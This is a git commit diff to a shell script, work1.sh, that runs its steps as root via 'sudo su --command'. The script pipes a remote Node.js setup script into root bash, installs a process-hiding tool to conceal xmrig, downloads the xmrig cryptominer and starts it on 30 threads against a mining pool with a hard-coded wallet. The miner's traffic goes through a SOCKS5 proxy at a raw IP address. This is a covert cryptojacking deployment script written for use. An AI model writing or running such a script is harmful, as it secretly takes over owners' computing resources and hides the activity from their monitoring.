c2dfee3af680508bdb592e18a97115a2aa894e97
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-07 23:05:21 +0800

    Update work1.sh

--- work1.sh
+++ work1.sh
@@ -1,12 +1,11 @@
 #!/bin/bash
-sudo apt update &&
-sudo apt upgrade -y &&
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
-sudo apt install nodejs &&
+sudo su --command "sudo apt update && sudo apt upgrade -y && 
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
+sudo apt install nodejs && 
 npm i -g node-process-hider &&
 sudo ph add xmrig &&
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz &&
 tar -zxf xmrig-6.16.4-linux-x64.tar.gz &&
 cd xmrig-6.16.4 &&
 chmod +x xmrig &&
-./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=30 -x socks5://192.252.214.20:15864;
+./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=30 -x socks5://192.252.214.20:15864"
